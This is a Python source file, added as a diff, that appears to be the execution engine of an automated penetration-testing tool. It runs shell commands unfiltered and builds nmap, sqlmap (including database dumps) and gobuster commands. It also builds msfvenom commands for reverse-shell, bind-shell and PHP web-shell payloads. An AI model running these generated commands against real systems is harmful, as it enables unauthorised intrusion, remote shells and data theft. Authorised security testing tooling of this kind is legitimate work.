@@ -1,0 +1,572 @@
+"""
+DRAKBEN Execution Engine
+Author: @drak_ben
+Description: 5 modules for intelligent command execution and monitoring
+"""
+
+import subprocess
+import threading
+import queue
+import time
+import re
+from typing import Dict, List, Optional, Callable, Tuple
+from dataclasses import dataclass
+from enum import Enum
+
+
+class ExecutionStatus(Enum):
+    """Status of command execution"""
+    PENDING = "pending"
+    RUNNING = "running"
+    SUCCESS = "success"
+    FAILED = "failed"
+    TIMEOUT = "timeout"
+    CANCELLED = "cancelled"
+
+
+@dataclass
+class ExecutionResult:
+    """Result of command execution"""
+    command: str
+    status: ExecutionStatus
+    stdout: str
+    stderr: str
+    exit_code: int
+    duration: float
+    timestamp: float
+
+
+# ====================
+# MODULE 1: SmartTerminal
+# ====================
+class SmartTerminal:
+    """Intelligent command executor with safety and monitoring"""
+    
+    def __init__(self):
+        self.execution_history: List[ExecutionResult] = []
+        self.current_process: Optional[subprocess.Popen] = None
+        
+    def execute(
+        self, 
+        command: str, 
+        timeout: int = 300,
+        capture_output: bool = True,
+        shell: bool = True,
+        callback: Optional[Callable] = None
+    ) -> ExecutionResult:
+        """Execute command with monitoring"""
+        start_time = time.time()
+        
+        try:
+            # Execute command
+            if capture_output:
+                process = subprocess.Popen(
+                    command,
+                    shell=shell,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+            else:
+                process = subprocess.Popen(command, shell=shell)
+            
+            self.current_process = process
+            
+            # Wait with timeout
+            try:
+                stdout, stderr = process.communicate(timeout=timeout)
+                exit_code = process.returncode
+                status = ExecutionStatus.SUCCESS if exit_code == 0 else ExecutionStatus.FAILED
+            except subprocess.TimeoutExpired:
+                process.kill()
+                stdout, stderr = process.communicate()
+                exit_code = -1
+                status = ExecutionStatus.TIMEOUT
+            
+            duration = time.time() - start_time
+            
+            result = ExecutionResult(
+                command=command,
+                status=status,
+                stdout=stdout or "",
+                stderr=stderr or "",
+                exit_code=exit_code,
+                duration=duration,
+                timestamp=start_time
+            )
+            
+            self.execution_history.append(result)
+            
+            if callback:
+                callback(result)
+            
+            return result
+            
+        except Exception as e:
+            duration = time.time() - start_time
+            result = ExecutionResult(
+                command=command,
+                status=ExecutionStatus.FAILED,
+                stdout="",
+                stderr=str(e),
+                exit_code=-1,
+                duration=duration,
+                timestamp=start_time
+            )
+            self.execution_history.append(result)
+            return result
+        finally:
+            self.current_process = None
+    
+    def execute_async(self, command: str) -> subprocess.Popen:
+        """Execute command asynchronously"""
+        process = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        self.current_process = process
+        return process
+    
+    def cancel_current(self) -> bool:
+        """Cancel currently running command"""
+        if self.current_process:
+            self.current_process.kill()
+            return True
+        return False
+    
+    def get_last_result(self) -> Optional[ExecutionResult]:
+        """Get last execution result"""
+        return self.execution_history[-1] if self.execution_history else None
+
+
+# ====================
+# MODULE 2: CommandGenerator
+# ====================
+class CommandGenerator:
+    """Generates optimized commands for different tools"""
+    
+    def generate_nmap_command(
+        self,
+        target: str,
+        scan_type: str = "full",
+        ports: Optional[str] = None,
+        script: Optional[str] = None
+    ) -> str:
+        """Generate optimized nmap command"""
+        
+        if scan_type == "quick":
+            cmd = f"nmap -T4 -F {target}"
+        elif scan_type == "stealth":
+            cmd = f"nmap -sS -T2 {target}"
+        elif scan_type == "aggressive":
+            cmd = f"nmap -A -T4 {target}"
+        elif scan_type == "version":
+            cmd = f"nmap -sV -T4 {target}"
+        else:  # full
+            cmd = f"nmap -sV -sC -T4 {target}"
+        
+        if ports:
+            cmd += f" -p {ports}"
+        
+        if script:
+            cmd += f" --script={script}"
+        
+        cmd += " -oN nmap_scan.txt"
+        
+        return cmd
+    
+    def generate_sqlmap_command(
+        self,
+        url: str,
+        level: int = 1,
+        risk: int = 1,
+        dbs: bool = False,
+        tables: bool = False,
+        dump: bool = False
+    ) -> str:
+        """Generate sqlmap command"""
+        cmd = f"sqlmap -u '{url}' --batch --level={level} --risk={risk}"
+        
+        if dbs:
+            cmd += " --dbs"
+        elif tables:
+            cmd += " --tables"
+        elif dump:
+            cmd += " --dump"
+        
+        return cmd
+    
+    def generate_gobuster_command(
+        self,
+        url: str,
+        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
+        extensions: Optional[str] = None
+    ) -> str:
+        """Generate gobuster command"""
+        cmd = f"gobuster dir -u {url} -w {wordlist}"
+        
+        if extensions:
+            cmd += f" -x {extensions}"
+        
+        cmd += " -o gobuster_results.txt"
+        
+        return cmd
+    
+    def generate_payload_command(
+        self,
+        payload_type: str,
+        lhost: str,
+        lport: int
+    ) -> str:
+        """Generate payload generation command"""
+        if payload_type == "reverse_shell":
+            return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
+        elif payload_type == "bind_shell":
+            return f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind.elf"
+        elif payload_type == "web_shell":
+            return f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php"
+        else:
+            return f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw"
+    
+    def optimize_command(self, command: str) -> str:
+        """Optimize command for better performance"""
+        # Add timeouts
+        if "curl" in command and "--connect-timeout" not in command:
+            command += " --connect-timeout 10"
+        
+        # Add output redirection if missing
+        if any(tool in command for tool in ["nmap", "gobuster", "nikto"]):
+            if "-o" not in command and ">" not in command:
+                command += " -oN scan_output.txt"
+        
+        return command
+
+
+# ====================
+# MODULE 3: OutputAnalyzer
+# ====================
+class OutputAnalyzer:
+    """Analyzes and parses command output intelligently"""
+    
+    def analyze(self, result: ExecutionResult) -> Dict:
+        """Analyze execution result and extract insights"""
+        analysis = {
+            "success": result.status == ExecutionStatus.SUCCESS,
+            "duration": result.duration,
+            "exit_code": result.exit_code,
+            "has_errors": bool(result.stderr),
+            "insights": []
+        }
+        
+        # Detect tool type from command
+        if "nmap" in result.command:
+            analysis.update(self._analyze_nmap(result.stdout))
+        elif "sqlmap" in result.command:
+            analysis.update(self._analyze_sqlmap(result.stdout))
+        elif "gobuster" in result.command:
+            analysis.update(self._analyze_gobuster(result.stdout))
+        elif "nikto" in result.command:
+            analysis.update(self._analyze_nikto(result.stdout))
+        
+        # Check for common errors
+        analysis["error_type"] = self._detect_error_type(result.stderr)
+        
+        return analysis
+    
+    def _analyze_nmap(self, output: str) -> Dict:
+        """Analyze nmap output"""
+        insights = []
+        open_ports = []
+        
+        # Find open ports
+        port_pattern = r'(\d+)/tcp\s+open\s+(\w+)'
+        matches = re.findall(port_pattern, output)
+        
+        for port, service in matches:
+            open_ports.append({"port": port, "service": service})
+            insights.append(f"Found open port {port} ({service})")
+        
+        return {
+            "tool": "nmap",
+            "open_ports": open_ports,
+            "total_open": len(open_ports),
+            "insights": insights
+        }
+    
+    def _analyze_sqlmap(self, output: str) -> Dict:
+        """Analyze sqlmap output"""
+        insights = []
+        vulnerable = False
+        
+        if "is vulnerable" in output.lower():
+            vulnerable = True
+            insights.append("SQL injection vulnerability found!")
+        
+        if "available databases" in output.lower():
+            insights.append("Database enumeration successful")
+        
+        return {
+            "tool": "sqlmap",
+            "vulnerable": vulnerable,
+            "insights": insights
+        }
+    
+    def _analyze_gobuster(self, output: str) -> Dict:
+        """Analyze gobuster output"""
+        insights = []
+        found_dirs = []
+        
+        # Find discovered directories
+        dir_pattern = r'(/.+?)\s+\(Status:\s+(\d+)\)'
+        matches = re.findall(dir_pattern, output)
+        
+        for path, status in matches:
+            found_dirs.append({"path": path, "status": status})
+            if status == "200":
+                insights.append(f"Found accessible directory: {path}")
+        
+        return {
+            "tool": "gobuster",
+            "found_directories": found_dirs,
+            "total_found": len(found_dirs),
+            "insights": insights
+        }
+    
+    def _analyze_nikto(self, output: str) -> Dict:
+        """Analyze nikto output"""
+        insights = []
+        
+        if "0 host(s) tested" not in output:
+            insights.append("Web server scan completed")
+        
+        return {
+            "tool": "nikto",
+            "insights": insights
+        }
+    
+    def _detect_error_type(self, stderr: str) -> Optional[str]:
+        """Detect type of error from stderr"""
+        if not stderr:
+            return None
+        
+        stderr_lower = stderr.lower()
+        
+        if "command not found" in stderr_lower or "not recognized" in stderr_lower:
+            return "missing_tool"
+        elif "permission denied" in stderr_lower:
+            return "permission_error"
+        elif "no route to host" in stderr_lower or "network unreachable" in stderr_lower:
+            return "network_error"
+        elif "timeout" in stderr_lower:
+            return "timeout_error"
+        elif "connection refused" in stderr_lower:
+            return "connection_error"
+        else:
+            return "unknown_error"
+
+
+# ====================
+# MODULE 4: StreamingMonitor
+# ====================
+class StreamingMonitor:
+    """Monitors command execution in real-time"""
+    
+    def __init__(self):
+        self.output_queue = queue.Queue()
+        self.monitoring = False
+        
+    def monitor_process(
+        self,
+        process: subprocess.Popen,
+        callback: Optional[Callable] = None
+    ) -> Tuple[str, str]:
+        """Monitor process output in real-time"""
+        stdout_lines = []
+        stderr_lines = []
+        
+        def read_stdout():
+            for line in process.stdout:
+                stdout_lines.append(line)
+                if callback:
+                    callback("stdout", line)
+        
+        def read_stderr():
+            for line in process.stderr:
+                stderr_lines.append(line)
+                if callback:
+                    callback("stderr", line)
+        
+        # Start threads
+        stdout_thread = threading.Thread(target=read_stdout)
+        stderr_thread = threading.Thread(target=read_stderr)
+        
+        stdout_thread.start()
+        stderr_thread.start()
+        
+        # Wait for completion
+        process.wait()
+        stdout_thread.join()
+        stderr_thread.join()
+        
+        return "".join(stdout_lines), "".join(stderr_lines)
+    
+    def stream_output(self, line_type: str, line: str):
+        """Stream output to queue"""
+        self.output_queue.put((line_type, line, time.time()))
+    
+    def get_latest_output(self) -> List[Tuple[str, str, float]]:
+        """Get all queued output"""
+        output = []
+        while not self.output_queue.empty():
+            output.append(self.output_queue.get())
+        return output
+
+
+# ====================
+# MODULE 5: ExecutionValidator
+# ====================
+class ExecutionValidator:
+    """Validates execution results and checks success criteria"""
+    
+    def validate(self, result: ExecutionResult, expected: Dict) -> Dict:
+        """Validate execution result against expectations"""
+        validation = {
+            "valid": True,
+            "checks": [],
+            "failures": []
+        }
+        
+        # Check exit code
+        if expected.get("exit_code") is not None:
+            if result.exit_code == expected["exit_code"]:
+                validation["checks"].append("Exit code matches")
+            else:
+                validation["valid"] = False
+                validation["failures"].append(f"Exit code {result.exit_code} != {expected['exit_code']}")
+        
+        # Check output contains
+        if expected.get("output_contains"):
+            for pattern in expected["output_contains"]:
+                if pattern in result.stdout:
+                    validation["checks"].append(f"Output contains '{pattern}'")
+                else:
+                    validation["valid"] = False
+                    validation["failures"].append(f"Output missing '{pattern}'")
+        
+        # Check no errors
+        if expected.get("no_errors", False):
+            if not result.stderr:
+                validation["checks"].append("No errors in stderr")
+            else:
+                validation["valid"] = False
+                validation["failures"].append("Stderr contains errors")
+        
+        # Check duration
+        if expected.get("max_duration"):
+            if result.duration <= expected["max_duration"]:
+                validation["checks"].append("Duration within limit")
+            else:
+                validation["valid"] = False
+                validation["failures"].append(f"Duration {result.duration}s > {expected['max_duration']}s")
+        
+        return validation
+    
+    def is_successful(self, result: ExecutionResult) -> bool:
+        """Quick check if execution was successful"""
+        return result.status == ExecutionStatus.SUCCESS and result.exit_code == 0
+    
+    def extract_error_message(self, result: ExecutionResult) -> Optional[str]:
+        """Extract meaningful error message"""
+        if result.stderr:
+            # Get first meaningful line
+            lines = result.stderr.strip().split('\n')
+            for line in lines:
+                if line.strip() and not line.startswith('#'):
+                    return line.strip()
+        return None
+
+
+# ====================
+# UNIFIED FACADE
+# ====================
+class ExecutionEngine:
+    """Main facade combining all 5 execution modules"""
+    
+    def __init__(self):
+        self.terminal = SmartTerminal()
+        self.generator = CommandGenerator()
+        self.analyzer = OutputAnalyzer()
+        self.monitor = StreamingMonitor()
+        self.validator = ExecutionValidator()
+    
+    def execute_smart(
+        self,
+        command: str,
+        timeout: int = 300,
+        optimize: bool = True,
+        callback: Optional[Callable] = None
+    ) -> Dict:
+        """Execute command with full intelligence"""
+        
+        # Optimize if requested
+        if optimize:
+            command = self.generator.optimize_command(command)
+        
+        # Execute
+        result = self.terminal.execute(command, timeout=timeout, callback=callback)
+        
+        # Analyze
+        analysis = self.analyzer.analyze(result)
+        
+        # Validate
+        validation = self.validator.validate(result, {"exit_code": 0})
+        
+        return {
+            "result": result,
+            "analysis": analysis,
+            "validation": validation,
+            "success": self.validator.is_successful(result)
+        }
+    
+    def execute_with_monitoring(
+        self,
+        command: str,
+        progress_callback: Optional[Callable] = None
+    ) -> Dict:
+        """Execute command with real-time monitoring"""
+        process = self.terminal.execute_async(command)
+        
+        stdout, stderr = self.monitor.monitor_process(process, progress_callback)
+        
+        result = ExecutionResult(
+            command=command,
+            status=ExecutionStatus.SUCCESS if process.returncode == 0 else ExecutionStatus.FAILED,
+            stdout=stdout,
+            stderr=stderr,
+            exit_code=process.returncode,
+            duration=0.0,
+            timestamp=time.time()
+        )
+        
+        analysis = self.analyzer.analyze(result)
+        
+        return {
+            "result": result,
+            "analysis": analysis,
+            "success": self.validator.is_successful(result)
+        }
+    
+    def get_execution_summary(self) -> Dict:
+        """Get summary of all executions"""
+        history = self.terminal.execution_history
+        
+        return {
+            "total_executions": len(history),
+            "successful": sum(1 for r in history if r.status == ExecutionStatus.SUCCESS),
+            "failed": sum(1 for r in history if r.status == ExecutionStatus.FAILED),
+            "average_duration": sum(r.duration for r in history) / len(history) if history else 0,
+            "last_command": history[-1].command if history else None
+        }
